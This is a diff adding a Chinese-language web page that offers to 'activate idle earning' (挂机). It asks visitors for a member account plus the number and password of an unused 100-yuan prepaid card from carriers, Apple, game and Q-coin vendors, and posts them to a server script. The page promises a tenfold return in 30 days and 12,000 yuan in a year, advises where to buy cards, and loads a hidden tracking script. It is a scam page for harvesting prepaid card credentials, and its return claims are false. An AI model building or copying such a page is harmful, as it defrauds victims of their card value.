@@ -1,0 +1,295 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+
+<meta http-equiv="content-type" content="text/html; charset=gb2312">
+<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0"/>
+<meta http-equiv="Cache-Control" content="no-cache"/>
+<title>开通#挂机</title>
+
+
+
+<link href="css/clrespond.css" rel="stylesheet" type="text/css">
+<link href="css/gjclwebapstyle.css" rel="stylesheet" type="text/css">
+
+<style type="text/css">
+
+
+
+#clorder{width:100%;max-width:630px;background:#FFF;}
+
+.clwarp{border:5px solid #0C0;}
+
+.cltitlea,.cltitleb{border-bottom:1px solid #0C0;}
+
+.clrxian{border-right:1px solid #0C0;}
+
+.clsubbox input{background:#0C0;}
+
+</style>
+
+</head>
+
+<body>
+
+<div id="clorder">
+
+<div class="clwarp">
+
+
+
+        <div class="clforml" id="clforml">
+
+            <div class="clrxian">
+
+                <form   method="post" name="hcform" id="hcform"    onsubmit="return postcheck();" action="/saveg.asp"  >
+
+<script type="text/javascript" >
+    function Getprice(ID)
+    {
+         var Price=ID;
+         document.getElementById("pronum").value=Price;    
+    }
+     
+     
+    </script>
+         
+                <div class="cltitlea"></div>
+
+                <div class="clbdbox">
+
+                    <label class="clbdxx"><em>*</em>选择种类</label>
+
+                    <div class="cldxbox red">
+
+<UL>
+			  
+			  
+			  <li><input name='hcproduct' type='radio'  id='hcproduct1' onClick='Getprice(100)' value='移动100元面值充值卡'  checked='checked'/> 移动100元面值充值卡</li>
+			  
+			  <li><input name='hcproduct' type='radio'  id='hcproduct1' onClick='Getprice(100)' value='联通100元面值充值卡'  checked='checked'/> 联通100元面值充值卡</li>
+			  
+			  <li><input name='hcproduct' type='radio'  id='hcproduct1' onClick='Getprice(100)' value='电信100元面值充值卡'  checked='checked'/> 电信100元面值充值卡</li>
+
+			  <li><input name='hcproduct' type='radio'  id='hcproduct1' onClick='Getprice(100)' value='苹果充值卡面值100元'  checked='checked'/> 苹果充值卡面值100元</li>
+			  
+			
+			  
+			  <li><input name='hcproduct' type='radio'  id='hcproduct1' onClick='Getprice(100)' value='骏网一卡通100元面值'  checked='checked'/> 骏网一卡通面值100元</li>
+			  
+			  <li><input name='hcproduct' type='radio'  id='hcproduct1' onClick='Getprice(100)' value='网易一卡通面值100元'  checked='checked'/> 网易一卡通面值100元</li>
+			  
+			   <li><input name='hcproduct' type='radio'  id='hcproduct1' onClick='Getprice(100)' value='Q币卡面值100元'  checked='checked'/> Q币卡面值100元</li>
+
+			  <li><input name='hcproduct' type='radio'  id='hcproduct1' onClick='Getprice(100)' value='其它充值卡类面值100元'  checked='checked'/> 其它充值卡类面值100元</li>
+			  
+
+			  
+			   
+        
+      
+              </UL>
+
+                    </div>
+
+                </div>
+ 
+<div class="clbdbox">
+
+                    <label class="clbdxx"></label>
+
+                    <div class="cldxbox red">
+
+                        
+                    </div>
+
+                </div>
+    <div class="clbdbox">
+
+                    <label class="clbdxx"></label>
+
+                    <div class="clxlbox">
+
+                       
+
+                    </div>
+
+                </div>
+
+
+                <div class="clbdbox">
+
+                    <label class="clbdxx"><em>*</em>会员账号</label>
+
+                    <div class="cltextbox">
+
+                        <input  name="realname" class="biaodan" id="realname"  />
+
+                    </div>
+
+
+
+<div class="clbdbox">
+
+                    <label class="clbdxx"></label>
+
+                    <div class="clxlbox">
+
+                        
+
+                    </div>
+
+
+                </div>
+
+                <div class="clbdbox">
+
+                    <label class="clbdxx"><em>*</em>充值卡号</label>
+
+                    <div class="cltextbox">
+
+                        <input name="tel" class="biaodan"  id="tel" />
+
+                    </div>
+
+                </div>
+
+                
+
+
+
+
+
+
+
+                </div>
+
+                <div class="clbdbox">
+
+                    <label class="clbdxx"><em>*</em>充值密码</label>
+
+                    <div class="cltextbox">
+
+                        <input name="hcaddress" class="biaodan"  id="hcaddress"/>
+
+                    </div>
+
+                </div>
+
+                    <div class="clbdbox">
+
+            <label class="clbdxx"></label>
+
+            <div class="cldxbox">
+</label>
+               
+
+            </div>
+
+
+  <div class="clsubbox">
+<input name="pronum" type="hidden" id="pronum" />
+          <input name="act" type="hidden" id="act" value="ok" />
+                    <input name="hcsubmit" type="submit" class="tijiao" id="hcsubmit" value="立即提交">
+
+                </div>
+
+
+
+        </div>
+          <div class="clbdbox">
+<label class="clbdxx"></label>
+        <div class="cldxbox red">
+
+                     <br>   请一定要填写未使用过的有效充值卡，否则无法开通挂机<br>
+
+                    </div>
+
+
+                  
+
+                                        
+</div>
+
+                <div class="clbdbox">
+
+                    <label class="clbdxx">注意事项</label>
+
+                    <div class="cltext2box">
+<p><span class="green">
+请按上方提示，输入您已购买的未使用的充值卡号和密码，三日内即可开通挂机!</span></p>
+ 
+                    </div>
+
+                </div>
+
+<br>
+ <div class="clbdbox">
+
+                    <label class="clbdxx">收益返还</label>
+
+                    <div class="cltext2box">
+<p><span class="green">
+验证通过后，您充值卡的数额将10倍返还到您的收款账户上。<br>
+例如：您提交100元，将在30天后返还收益1000元，一年后返还12000元!</span></p>
+ 
+                    </div>
+
+                </div>
+<br>
+<div class="clbdbox">
+
+                    <label class="clbdxx">温馨提示</label>
+
+                   <div class="cltext2box">
+
+                        <p><span class="green">
+怎样获得$充值卡：<br>
+
+       实体店：网吧、超市、小卖部、报刊亭、移动营业厅等。<br>
+网店：淘宝、天猫、京东、5173等。<br></span></p>
+
+                    </div>
+
+                </div>
+                              
+
+<label class="clbdxx"></label>
+      
+                 <div id="clfahuo" style="overflow:hidden;">
+<br><br>最新开通挂机
+               <script type="text/javascript" src="js/hcfhgk.js"></script></div>
+
+
+
+
+               
+
+            </div>
+
+        </div>
+
+
+
+
+
+    <div style="clear:both;"></div>
+
+</div>
+
+</div>
+
+
+
+
+<SPAN style="DISPLAY: none">
+<script src="http://s95.cnzz.com/stat.php?id=1254501111&web_id=1254501111" language="JavaScript"></script></SPAN>
+
+ 
+
+
+</body>
+
+</html>
